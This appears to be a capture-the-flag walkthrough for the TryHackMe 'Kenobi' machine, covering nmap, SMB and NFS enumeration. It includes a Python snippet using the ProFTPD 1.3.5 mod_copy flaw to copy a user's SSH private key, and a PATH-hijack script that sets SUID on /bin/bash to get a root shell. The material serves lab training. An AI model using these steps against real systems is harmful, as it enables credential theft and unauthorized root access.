#Kenobi_machine
```http
https://tryhackme.com/room/kenobi
```

```ip
10.10.215.122
```
___
____
# Recon
## Nmap
```bash
nmap 10.10.215.122 -p- -sC -sV -Pn  -vv -oN  scan.txt 
```

```bash
21/tcp    open  ftp         syn-ack ttl 63 ProFTPD 1.3.5
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     syn-ack ttl 63 2-3 (RPC #100227)
37641/tcp open  mountd      syn-ack ttl 63 1-3 (RPC #100005)
43739/tcp open  nlockmgr    syn-ack ttl 63 1-4 (RPC #100021)
51825/tcp open  mountd      syn-ack ttl 63 1-3 (RPC #100005)
59047/tcp open  mountd      syn-ack ttl 63 1-3 (RPC #100005)
```


## Enum4linux
```bash
enum4linux 10.10.215.122
```

```bash
//10.10.215.122/anonymous       Mapping: OK Listing: OK Writing: N/A
```


## SMB
```bash
smbclient  //10.10.215.122/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (13.6 KiloBytes/sec) (average 13.6 KiloBytes/sec)
smb: \> exit
```


# NFS!
```bash
showmount -e 10.10.215.122
mkdir -p /mnt/bnfs_var
mount -t nfs 10.10.215.122:/var /tmp/nfs
```

```http
https://raw.githubusercontent.com/cdedmondson/Modified-CVE-2015-3306-Exploit/refs/heads/master/modified_cve_2015_3306.py
```
# Exploits
> [!NOTE]
> 21/tcp    open  ftp         syn-ack ttl 63 ProFTPD 1.3.5

```bash
import socket  
s = socket.socket()  
s.connect(("10.10.215.122", 21))  
s.send(b"SITE CPFR /home/kenobi/.ssh/id_rsa\r\n")  
s.send(b"SITE CPTO /var/tmp/id_rsa_copy\r\n")
```

# LPE
```bash
strings /usr/bin/menu
curl -I localhost
```

```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
/bin/bash -p
```


